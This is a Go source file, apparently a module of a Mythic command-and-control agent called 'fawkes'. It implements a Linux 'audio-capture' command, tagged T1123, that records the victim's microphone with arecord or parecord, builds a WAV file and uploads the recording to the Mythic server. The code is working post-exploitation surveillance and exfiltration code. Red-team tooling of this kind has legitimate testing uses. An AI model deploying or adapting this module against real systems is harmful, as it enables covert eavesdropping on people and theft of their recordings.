//go:build linux

package commands

import (
	"encoding/json"
	"fmt"
	"os/exec"
	"strconv"
	"time"

	"fawkes/pkg/structs"
)

type AudioCaptureCommand struct{}

func (c *AudioCaptureCommand) Name() string        { return "audio-capture" }
func (c *AudioCaptureCommand) Description() string { return "Record audio from microphone (T1123)" }

func (c *AudioCaptureCommand) Execute(task structs.Task) structs.CommandResult {
	var params audioCaptureParams
	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
		return errorf("Error parsing parameters: %v", err)
	}
	audioDefaultParams(&params)

	bitsPerSample := 16
	device := params.Device
	if device == "" {
		device = "default"
	}

	// Use arecord (ALSA utility) which is available on most Linux systems.
	// This avoids complex ALSA library FFI and works reliably.
	// arecord outputs raw WAV directly.
	args := []string{
		"-D", device,
		"-f", fmt.Sprintf("S%dLE", bitsPerSample), // Signed 16-bit Little Endian
		"-r", strconv.Itoa(params.SampleRate),
		"-c", strconv.Itoa(params.Channels),
		"-t", "wav",
		"-d", strconv.Itoa(params.Duration),
		"-q", // quiet
		"-",  // output to stdout
	}

	startTime := time.Now()

	// Run arecord with timeout
	cmd := exec.Command("arecord", args...)
	wavData, err := audioRunWithTimeout(cmd, task, params.Duration+5)
	if err != nil {
		// Try PulseAudio's parecord as fallback
		paArgs := []string{
			"--format=s16le",
			"--rate=" + strconv.Itoa(params.SampleRate),
			"--channels=" + strconv.Itoa(params.Channels),
			"--raw",
		}
		paCmd := exec.Command("parecord", paArgs...)
		rawData, paErr := audioRunWithTimeout(paCmd, task, params.Duration)
		if paErr != nil {
			return errorf("Audio capture failed. arecord: %v. parecord: %v. Install alsa-utils or pulseaudio-utils.", err, paErr)
		}
		// parecord outputs raw PCM — wrap in WAV
		wavHeader := buildWAVHeader(len(rawData), params.SampleRate, params.Channels, bitsPerSample)
		wavData = append(wavHeader, rawData...)
	}

	if len(wavData) < 45 { // WAV header is 44 bytes, need at least some data
		return errorf("No audio data captured — no microphone or device busy")
	}

	// Upload WAV file to Mythic
	uploadMsg := structs.SendFileToMythicStruct{}
	uploadMsg.Task = &task
	uploadMsg.IsScreenshot = false
	uploadMsg.SendUserStatusUpdates = false
	uploadMsg.Data = &wavData
	uploadMsg.FileName = fmt.Sprintf("audio_capture_%s.wav", time.Now().Format("20060102_150405"))
	uploadMsg.FullPath = ""
	uploadMsg.FinishedTransfer = make(chan int, 2)

	task.Job.SendFileToMythic <- uploadMsg

	for {
		select {
		case <-uploadMsg.FinishedTransfer:
			result := audioCaptureResult{
				Duration:    time.Since(startTime).Truncate(time.Second).String(),
				SampleRate:  params.SampleRate,
				Channels:    params.Channels,
				BitsPerSamp: bitsPerSample,
				DataSize:    len(wavData),
				DeviceUsed:  device,
			}
			output, _ := json.Marshal(result)
			return successResult(string(output))
		case <-time.After(1 * time.Second):
			if task.DidStop() {
				return errorResult("Audio capture upload cancelled")
			}
		}
	}
}

// audioRunWithTimeout runs a command with a duration-based timeout and task cancellation.
func audioRunWithTimeout(cmd *exec.Cmd, task structs.Task, timeoutSecs int) ([]byte, error) {
	done := make(chan struct{})
	var output []byte
	var cmdErr error

	go func() {
		output, cmdErr = cmd.Output()
		close(done)
	}()

	deadline := time.After(time.Duration(timeoutSecs) * time.Second)
	for {
		select {
		case <-done:
			return output, cmdErr
		case <-deadline:
			if cmd.Process != nil {
				_ = cmd.Process.Kill()
			}
			return output, fmt.Errorf("timeout after %ds", timeoutSecs)
		case <-time.After(500 * time.Millisecond):
			if task.DidStop() {
				if cmd.Process != nil {
					_ = cmd.Process.Kill()
				}
				return nil, fmt.Errorf("task cancelled")
			}
		}
	}
}
